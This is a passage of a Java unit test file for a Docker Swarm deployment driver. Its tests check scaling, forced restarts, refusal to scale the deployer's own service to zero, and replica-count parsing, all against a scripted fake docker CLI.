    cli.script("--format {{.ID}}", result(0, "svc123"));
    cli.script("service update", result(1, "Error response from daemon: rpc error"));

    DeploymentDriver.ApplyResult applied = driver.apply(spec());

    assertEquals(DeploymentDriver.ApplyOutcome.REFUSED, applied.outcome());
    assertTrue(applied.detail().contains("rpc error"), applied.detail());
  }

  // --- the operator's two levers ----------------------------------------------------------------

  @Test
  void aScaleIsAServiceUpdateThatStatesTheCountAndNothingElse() {
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));

    DeploymentDriver.ScaleResult scaled = driver.scale("dev-qits-gateway", 0);

    assertEquals(DeploymentDriver.ScaleOutcome.SCALED, scaled.outcome());
    List<String> argv = cli.matching("service update");
    assertEquals(
        List.of(
            "docker", "service", "update", "--detach", "--replicas", "0", "dev-qits-gateway"),
        argv,
        "a scale changes the count and touches nothing else about the service");
  }

  @Test
  void scalingSomethingTheOrchestratorDoesNotHaveIsRefusedRatherThanAttempted() {
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}}", result(1, "Error: no such service: dev-qits-gateway"));

    DeploymentDriver.ScaleResult scaled = driver.scale("dev-qits-gateway", 1);

    assertEquals(DeploymentDriver.ScaleOutcome.REFUSED, scaled.outcome());
    assertTrue(scaled.detail().contains("no service dev-qits-gateway"), scaled.detail());
    assertEquals(0, cli.count("service update"), "nothing was issued");
  }

  @Test
  void theSeedStacksTwinIsWhatAnOperatorsScaleFindsWhenTheBareNameIsNotThere() {
    // The same fallback observe() and runningImage() have: on a platform whose deployer still runs
    // as the seed, the service really is called qits_dev-qits-gateway and an operator's lever must
    // reach it rather than report that the application does not exist.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(1, "no such service"));
    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(0, "svc123"));

    assertEquals(DeploymentDriver.ScaleOutcome.SCALED, driver.scale("dev-qits-gateway", 0).outcome());
    assertTrue(cli.matching("service update").contains("qits_dev-qits-gateway"));
  }

  @Test
  void theDeployersOwnServiceCannotBeScaledToZeroAndNothingIsIssued() {
    // There would be nothing left to scale it back up, and the API that would have done it is what
    // stops answering.
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("task-container-id");
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("com.docker.swarm.service.name", result(0, "dev-qits-gateway"));

    DeploymentDriver.ScaleResult scaled = driver.scale("dev-qits-gateway", 0);

    assertEquals(DeploymentDriver.ScaleOutcome.REFUSED, scaled.outcome());
    assertTrue(scaled.detail().contains("nothing would be left to scale it back up"), scaled.detail());
    assertEquals(0, cli.count("service update"), "the refusal happens before anything is issued");
  }

  @Test
  void scalingTheDeployerUpIsAllowedAndIsHandedToTheManager() {
    SwarmDeploymentDriver driver = driver();
    driver.hostnameFile = hostnameFile("task-container-id");
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script("com.docker.swarm.service.name", result(0, "dev-qits-gateway"));

    DeploymentDriver.ScaleResult scaled = driver.scale("dev-qits-gateway", 1);

    assertEquals(DeploymentDriver.ScaleOutcome.HANDED_OFF, scaled.outcome());
    assertTrue(scaled.applied());
  }

  @Test
  void aRestartIsAForcedUpdateThatSaysNothingAboutWhatTheServiceRuns() {
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script(".Spec.Mode.Replicated", result(0, "1"));

    DeploymentDriver.ScaleResult restarted = driver.restart("dev-qits-gateway");

    assertEquals(DeploymentDriver.ScaleOutcome.SCALED, restarted.outcome());
    assertEquals(
        List.of("docker", "service", "update", "--detach", "--force", "dev-qits-gateway"),
        cli.matching("--force"),
        "no image, no environment, no labels: a bounce is not a deployment");
  }

  @Test
  void restartingAServiceDeclaredToRunNoTasksIsRefusedRatherThanReportedAsABounce() {
    // `--force` on a service at 0 replicas succeeds and does nothing at all, so an operator would
    // be told a stopped application had been restarted.
    SwarmDeploymentDriver driver = driver();
    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
    cli.script(".Spec.Mode.Replicated", result(0, "0"));

    DeploymentDriver.ScaleResult restarted = driver.restart("dev-qits-gateway");

    assertEquals(DeploymentDriver.ScaleOutcome.REFUSED, restarted.outcome());
    assertTrue(restarted.detail().contains("scale it up"), restarted.detail());
    assertEquals(0, cli.count("--force"));
  }

  @Test
  void theDesiredCountIsReadOffTheServiceSpec() {
    SwarmDeploymentDriver driver = driver();
    cli.script(".Spec.Mode.Replicated", result(0, "0\n"));

    assertEquals(0, driver.desiredReplicas("dev-qits-gateway").getAsInt());
  }

  @Test
  void aRuntimeThatCannotAnswerDeclaresNothingRatherThanZero() {
    // The whole safety of the observer's third arm: an unreadable answer read as a deliberate zero
    // would turn every outage into a pause nobody is ever paged for.
    SwarmDeploymentDriver driver = driver();
    cli.script(".Spec.Mode.Replicated", result(1, "no such service"));

    assertTrue(driver.desiredReplicas("dev-qits-gateway").isEmpty());
    assertTrue(SwarmDeploymentDriver.parseReplicas("<no value>").isEmpty());
    assertTrue(SwarmDeploymentDriver.parseReplicas("").isEmpty());
    assertTrue(SwarmDeploymentDriver.parseReplicas(null).isEmpty());
    assertEquals(3, SwarmDeploymentDriver.parseReplicas(" 3 ").getAsInt());
  }

  @Test
  void aDeploymentRestatesTheReplicaCountSoAPausedApplicationComesBackWithIt() {
    // A service left at 0 takes `service update --image` happily: swarm has no task to converge, so
    // the update completes at once and the row is recorded ACTIVE with nothing running behind it.
    List<String> argv = driver().buildUpdateArgv(spec(), "dev-qits-gateway");

    int flag = argv.indexOf("--replicas");
    assertTrue(flag >= 0, argv.toString());
    assertEquals("1", argv.get(flag + 1));
  }

  // --- the scripted seam --------------------------------------------------------------------

  /** A container id file of this test's own, so nothing here depends on the build host. */
  private static Path hostnameFile(String id) {
    try {
      Path file = Files.createTempFile("qits-swarm-hostname", "");
      file.toFile().deleteOnExit();
      Files.writeString(file, id + "\n");
      return file;
    } catch (IOException e) {
      throw new IllegalStateException(e);
    }
  }

  private static PdProcess.Result result(int exitCode, String output) {
    return new PdProcess.Result(exitCode, output, false, false);
  }

  /**
   * The docker CLI, scripted by a substring of the argv. Answers are consumed in order and the last
   * one repeats, which is what makes a polling test a list of readings rather than a state machine.
   */
  private static final class ScriptedCli implements SwarmDeploymentDriver.Cli {

    final List<List<String>> calls = Collections.synchronizedList(new ArrayList<>());
    private final Map<String, Deque<PdProcess.Result>> scripted = new LinkedHashMap<>();

    void script(String argvContains, PdProcess.Result... answers) {
      scripted.put(argvContains, new ArrayDeque<>(List.of(answers)));
    }

    @Override
    public PdProcess.Result run(List<String> argv, Duration timeout) {
      calls.add(List.copyOf(argv));
      String joined = String.join(" ", argv);
      for (Map.Entry<String, Deque<PdProcess.Result>> entry : scripted.entrySet()) {
        if (joined.contains(entry.getKey())) {
          Deque<PdProcess.Result> answers = entry.getValue();
          return answers.size() == 1 ? answers.peek() : answers.poll();
        }
      }
      return result(0, "");
    }

    /** The one call whose argv contains this, failing loudly when there is none. */
    List<String> matching(String argvContains) {
      return calls.stream()
          .filter(argv -> String.join(" ", argv).contains(argvContains))
          .findFirst()
          .orElse(List.of());
    }

    int count(String argvContains) {
      return (int)
          calls.stream().filter(argv -> String.join(" ", argv).contains(argvContains)).count();
    }
  }
}
